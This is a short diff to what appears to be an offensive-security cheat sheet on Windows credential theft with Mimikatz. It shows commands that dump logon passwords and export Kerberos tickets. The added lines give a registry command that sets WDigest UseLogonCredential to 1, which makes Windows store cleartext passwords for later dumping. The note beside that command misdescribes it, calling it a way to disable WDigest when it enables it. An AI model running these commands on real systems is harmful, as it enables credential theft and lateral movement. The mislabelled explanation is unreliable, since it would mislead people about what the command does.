@@ -12,6 +12,10 @@ tags:
 ```powershell
 PS > .\mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
 ```
+>Note: If the password field is blank, the WDigest might be enabled, you can disable it with:
+```powershell
+PS > reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+```
 ## Export Tickets
 ```powershell
 PS > .\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
